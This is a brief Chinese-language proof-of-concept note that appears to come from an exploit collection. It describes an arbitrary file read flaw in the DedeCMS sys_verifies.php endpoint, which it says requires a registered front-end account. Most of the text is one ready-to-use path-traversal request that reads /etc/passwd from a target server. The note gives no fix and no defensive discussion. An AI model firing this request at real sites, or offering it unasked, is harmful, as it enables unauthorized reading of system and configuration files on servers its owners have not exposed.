# DeDecms接口sys_verifies.php存在任意文件读取漏洞

需前台注册用户权限。

## poc

```java
http://ip/dede/sys_verifies.php?action=view&filename=../../../../../etc/passwd
```

